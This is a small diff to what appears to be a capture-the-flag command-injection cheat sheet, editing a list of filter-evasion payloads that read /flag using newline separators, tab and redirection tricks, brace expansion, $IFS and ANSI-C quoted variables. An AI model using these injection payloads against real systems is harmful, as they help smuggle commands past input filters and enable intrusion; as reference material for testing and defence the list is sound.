@@ -10,7 +10,7 @@
     - Newline (0x0A, \n, %0A)
 - Space Bypass
     - $ cat`<TAB>`/flag
-    - $ cat\</flag
+    - $ cat`<`/flag
     - $ {cat,/flag}
     - $ cat$IFS/flag
     - $ X=$'cat\x20/flag'&&$X
